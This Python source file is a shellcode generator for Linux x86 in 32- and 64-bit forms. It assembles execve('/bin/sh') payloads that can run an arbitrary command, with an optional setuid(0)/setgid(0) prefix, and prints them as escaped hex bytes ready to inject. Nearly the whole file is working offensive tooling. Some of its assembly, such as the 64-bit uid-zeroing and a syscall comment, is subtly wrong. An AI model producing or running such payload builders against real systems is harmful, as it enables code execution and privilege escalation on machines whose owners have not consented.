#!/usr/bin/env python3
#       _____   ____      _          _ _               _      
#      |  _  | / ___|    | |        | | |             | |     
# __  __\ V / / /___  ___| |__   ___| | | ___ ___   __| | ___ 
# \ \/ // _ \ | ___ \/ __| '_ \ / _ \ | |/ __/ _ \ / _` |/ _ \
#  >  <| |_| || \_/ |\__ \ | | |  __/ | | (_| (_) | (_| |  __/
# /_/\_\_____/\_____/|___/_| |_|\___|_|_|\___\___/ \__,_|\___|
# Shellcode Builder for Linux x86 - 32Bit / 64Bit             
#                                                             
# execve("//bin/sh", ["//bin/sh"], NULL)                      
# execve("//bin/sh", ["//bin/sh", "-c", "COMMAND"], NULL)     

import argparse
import subprocess
import tempfile

from jinja2 import Template
from rgbprint import gradient_print, Color
from textwrap import wrap

#
#
#

X86_32BIT_SHELLCODE_TEMPLATE = '''
section .text
global _start
_start:
{{ ROOT_TEMPLATE }}
{{ EXECVE_TEMPLATE }}
'''

X86_64BIT_SHELLCODE_TEMPLATE = '''
section .text
global _start
_start:
{{ ROOT_TEMPLATE }}
{{ EXECVE_TEMPLATE }}
'''

X86_32BIT_SHELLCODE_ROOT_TEMPLATE = '''
;setuid
; - eax = syscall number - (23, 0x17)
; - ebx = uid_t uid
push 0x17
pop eax
xor ebx, ebx
int 0x80
;setgid
; - eax = syscall number - (46, 0x2e)
; - ebx = gid_t gid
push 0x2e
pop eax
xor ebx, ebx
int 0x80
'''

X86_64BIT_SHELLCODE_ROOT_TEMPLATE = '''
;setuid
; - rax = syscall number (105, 0x69)
; - rdi = uid_t uid
push 0x69
pop rax
shl rdi, 0x1
neg rdi
syscall
;setguid
; - rax = syscall number (105, 0x6a)
; - rdi = gid_t gid
push 0x6a
pop rax
shl rdi, 0x1
neg rdi
syscall
'''

X86_32BIT_SHELLCODE_EXECVE_TEMPLATE = '''
; execve
xor edx, edx
; //bin/sh
push edx
push dword 0x68732f6e
push dword 0x69622f2f
lea ebx, [esp]
; -c
{{ PARAMETER }}
; COMMAND
{{ COMMAND }}
; execve argument array
push edx 
push ecx
push eax
push ebx
lea ecx, [esp]
push 0x0b
pop eax
int 0x80
'''

X86_64BIT_SHELLCODE_EXECVE_TEMPLATE = '''
; execve
xor rax, rax
xor rdx, rdx
; //bin/sh
push rdx
mov rbx, 0x68732f6e69622f2f
push rbx
lea rdi, [rsp]
; -c
{{ PARAMETER }}
; COMMAND
{{ COMMAND }}
; execve argument array
push rdx
push rcx
push rsi
push rdi
lea rsi, [rsp]
push 0x3b
pop rax
syscall
'''

#
#
#

class x86shellcode():
    _arch32bit: bool
    _root: bool
    _command: str


    def __init__(self, args) -> None:
        self._arch32bit = args.arch32bit
        self._root = args.root
        self._command = args.command


    def _compile(self, shellcode) -> str:
        o_file = tempfile.NamedTemporaryFile(suffix='.o', delete=False).name
        elf_file = tempfile.NamedTemporaryFile(suffix='.elf', delete=False).name
        asm_file = tempfile.NamedTemporaryFile(suffix='.asm', delete=False).name

        with open(asm_file, 'w') as file:
            file.write(shellcode)

        if self._arch32bit == True:
            nasm_instruction = ['nasm', '-f', 'elf32', '-o', o_file, asm_file]
            ld_instruction = ['ld', '-m', 'elf_i386', '-o', elf_file, o_file]
        else:
            nasm_instruction = ['nasm', '-f', 'elf64', '-o', o_file, asm_file]
            ld_instruction = ['ld', '-m', 'elf_x86_64', '-o', elf_file, o_file]

        bin_file = tempfile.NamedTemporaryFile(suffix='.bin', delete=False).name

        objcopy = ['objcopy', '-Obinary', elf_file, bin_file]
        hexdump = ['hexdump', '-v', '-e', '"\\\\""x" 1/1 "%02x" ""', bin_file]

        try:
            process = subprocess.run(
                nasm_instruction,
                capture_output=True,
            )
        except Exception as error:
            raise Exception('nasm error.' + str(error))

        try:
            process = subprocess.run(
                ld_instruction,
                capture_output=True,
            )
        except Exception as error:
            raise Exception('ld error.' + str(error))

        try:
            process = subprocess.run(
                objcopy,
                capture_output=True,
            )
        except Exception as error:
            raise Exception('objcopy error.' + str(error))

        try:
            process = subprocess.run(
                hexdump,
                capture_output=True,
            )
            shellcode = process.stdout.decode('utf-8')
        except Exception as error:
            raise Exception('hexdump error.' + str(error))

        return shellcode


    def _prepare_command(self) -> str:
        command = ''
        command_byte_size = len(self._command)

        assembly_size_words = {
            '1': 'byte',
            '2': 'word',
            '4': 'dword',
            '8': 'qword',
        }

        command_cache = []
        command_len = len(self._command)
        if self._arch32bit == True:
            self._command = wrap(self._command, 4)
            for z in range(len(self._command)):
                command_cache.append(self._command[z][::-1])
            command_cache = command_cache[::-1]
        else:
            self._command = wrap(self._command[::-1], 4)
            command_cache = self._command[::-1]
        self._command = command_cache

        command_cache = []
        command_len = len(self._command)
        for z in range(command_len):    
            command_z_len = len(self._command[z])
            if command_z_len == 3:
                elements = wrap(self._command[z][::-1], 2)
                command_cache.extend(elements[::-1])
            else:
                command_cache.append(self._command[z])
        self._command = command_cache

        command_cache = []
        for z in range(len(self._command)):
            chunk_cache = ''
            for y in range(len(self._command[z])):
                chunk_cache += bytes(self._command[z][y], 'ascii').hex()
            command_cache.append([chunk_cache])
        self._command = command_cache

        current_len = 0
        past_len = 0
        for z in range(len(command_cache)):
            for y in range(len(command_cache[z])):
                current_len = int(len(command_cache[z][y]) / 2)
            size_word_cache = ''
            size_word_len = str(current_len)
            if size_word_len in assembly_size_words:
                size_word_cache = assembly_size_words[size_word_len]
            if self._arch32bit == True:
                command += 'push ' + size_word_cache + ' 0x' + command_cache[z][y] + '\n'
            else:
                command += 'mov ' + size_word_cache + ' [rsp+' + str(past_len) + '], 0x' + command_cache[z][y] + '\n'
                past_len = past_len + current_len

        if self._arch32bit == True:
            self._command = 'push edx\n'
            self._command += command
            self._command += 'lea ecx, [esp]\n'
        else:
            self._command = 'push rdx\n'
            self._command += 'push rdx\nsub rsp, ' + str(command_byte_size) + '\n'
            self._command += command
            self._command += 'lea rcx, [rsp]'
        command = self._command

        return command


    def _prepare_shellcode(self) -> str:
        shellcode = ''

        if self._arch32bit == True:
            if self._root == True:
                root_template = X86_32BIT_SHELLCODE_ROOT_TEMPLATE
            else:
                root_template = ''

            if self._command == None:    
                execve_template = Template(X86_32BIT_SHELLCODE_EXECVE_TEMPLATE)
                execve_context = {
                    'COMMAND': 'xor eax, eax\nxor ecx, ecx',
                }
                execve_template = execve_template.render(**execve_context)
            else:
                command = self._prepare_command()
                execve_template = Template(X86_32BIT_SHELLCODE_EXECVE_TEMPLATE)
                execve_context = {
                    'PARAMETER': 'push edx\npush word 0x632d\nlea eax, [esp]\n',
                    'COMMAND': command,
                }
                execve_template = execve_template.render(**execve_context)

            shellcode_template = Template(X86_32BIT_SHELLCODE_TEMPLATE)
            shellcode_context = {
                'ROOT_TEMPLATE': root_template.strip(),
                'EXECVE_TEMPLATE': execve_template.strip(),
            }
            shellcode = shellcode_template.render(**shellcode_context)
        else:
            if self._root == True:
                root_template = X86_64BIT_SHELLCODE_ROOT_TEMPLATE
            else:
                root_template = ''

            if self._command == None:    
                execve_template = Template(X86_64BIT_SHELLCODE_EXECVE_TEMPLATE)
                execve_context = {
                    'COMMAND': 'xor rcx, rcx\nxor rsi, rsi',
                }
                execve_template = execve_template.render(**execve_context)
            else:
                command = self._prepare_command()
                execve_template = Template(X86_64BIT_SHELLCODE_EXECVE_TEMPLATE)
                execve_context = {
                    'PARAMETER': 'push rdx\nsub rsp, 2\nmov word [rsp], 0x632d\nlea rsi, [rsp]\n',
                    'COMMAND': command,
                }
                execve_template = execve_template.render(**execve_context)

            shellcode_template = Template(X86_64BIT_SHELLCODE_TEMPLATE)
            shellcode_context = {
                'ROOT_TEMPLATE': root_template.strip(),
                'EXECVE_TEMPLATE': execve_template.strip(),
            }
            shellcode = shellcode_template.render(**shellcode_context)

        return shellcode


    def builder(self) -> str:
        shellcode = self._prepare_shellcode()
        shellcode = self._compile(shellcode)

        return shellcode

#

def main():
    banner = []
    banner.append(r'''      _____   ____      _          _ _               _       ''')
    banner.append(r'''     |  _  | / ___|    | |        | | |             | |      ''')
    banner.append(r'''__  __\ V / / /___  ___| |__   ___| | | ___ ___   __| | ___  ''')
    banner.append(r'''\ \/ // _ \ | ___ \/ __| '_ \ / _ \ | |/ __/ _ \ / _` |/ _ \ ''')
    banner.append(r''' >  <| |_| || \_/ |\__ \ | | |  __/ | | (_| (_) | (_| |  __/ ''')
    banner.append(r'''/_/\_\_____/\_____/|___/_| |_|\___|_|_|\___\___/ \__,_|\___| ''')
    banner.append(r'''Shellcode Builder for Linux x86 - 32Bit / 64Bit              ''')
    banner.append(r'''                                                             ''')
    banner.append(r'''execve("//bin/sh", ["//bin/sh"], NULL)                       ''')
    banner.append(r'''execve("//bin/sh", ["//bin/sh", "-c", "COMMAND"], NULL)      ''')
    for line in banner:
        gradient_print(
            line,
            start_color=Color.red,
            end_color=Color.yellow,
        )

    parser = argparse.ArgumentParser(description='Shellcode Builder for Linux x86 - 32Bit / 64Bit')
    parser.add_argument('--arch32bit', action=argparse.BooleanOptionalAction, default=True)
    parser.add_argument('--root', action=argparse.BooleanOptionalAction, default=True)
    parser.add_argument('--command', required=False)
    args = parser.parse_args()

    shellcode = x86shellcode(args)
    shellcode = shellcode.builder()

    print('Shellcode Length: ', str(int(len(shellcode) / 4)))
    print(shellcode)

#

if __name__ == '__main__':
    main()
